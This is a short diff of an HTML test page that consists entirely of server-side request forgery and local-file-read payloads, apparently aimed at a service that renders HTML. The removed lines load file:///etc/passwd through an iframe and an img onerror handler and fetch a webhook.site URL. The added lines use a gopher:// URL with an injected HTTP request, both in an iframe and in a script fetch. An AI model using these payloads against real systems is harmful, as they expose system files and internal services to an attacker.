@@ -7,8 +7,8 @@
     <title>Document</title>
 </head>
 <body>
-    <iframe src="file:///etc/passwd" width="400" height="400">
-        <img src onerror="document.write(`<iframe src='file:///etc/passwd'></iframe>`)">
+    <iframe src="gopher://<server>:8080/_GET / HTTP/1.0%0A%0A" width="400" height="400">
+       
 
-        <script>fetch('https://webhook.site/9025ca9e-250d-449a-9b92-4a75699eea34').then(r=>r.text()).then(s=>alert(s))</script>
+        <script>fetch('gopher://<server>:8080/_GET / HTTP/1.0%0A%0A').then(r=>r.text()).then(s=>alert(s))</script></iframe>
 </html>
